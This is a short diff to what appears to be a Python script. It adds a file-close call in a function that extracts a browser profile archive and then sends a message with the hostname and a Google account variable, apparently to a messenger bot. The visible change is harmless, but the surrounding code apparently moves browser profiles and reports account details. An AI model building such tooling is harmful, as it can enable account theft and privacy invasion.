@@ -80,6 +80,7 @@ def extact_gc_profile():
 	# os.system(comom_2)
 	pth_extr='./'
 	file.extractall(pth_extr)
+	file.close()
 	mssgg_tel=" [ "+hostname_os +" ] \n [ EXTRACT ] [ "+g00g_acc +" ]"
 	send_msg_dock(mssgg_tel)
 
